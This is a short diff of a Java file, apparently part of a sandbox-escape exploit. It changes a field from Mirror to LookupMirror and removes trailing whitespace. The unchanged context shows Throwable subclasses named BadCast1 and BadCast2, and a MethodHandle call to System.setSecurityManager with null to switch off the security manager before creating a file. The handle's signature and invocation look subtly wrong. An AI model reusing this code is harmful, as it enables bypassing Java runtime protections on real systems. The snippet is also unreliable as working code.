@@ -11,7 +11,7 @@ public class Main {
         }
 
         public static class BadCast2 extends Throwable{
-                Mirror lm = new Mirror();
+                LookupMirror lm = new LookupMirror();
         }
 
         public static void throwEx() throws BadCast1{
@@ -28,7 +28,7 @@ public class Main {
                 MethodType metType = MethodType.methodType(void.class, System.class);
                 MethodHandle metHandle = MethodHandles.lookup().findStatic(System.class, "setSecurityManager", metType);
              	metHandle.invokeExact(System.class, null);
-             	
+
                 try {
        			File file = new File("myfile.txt");
 
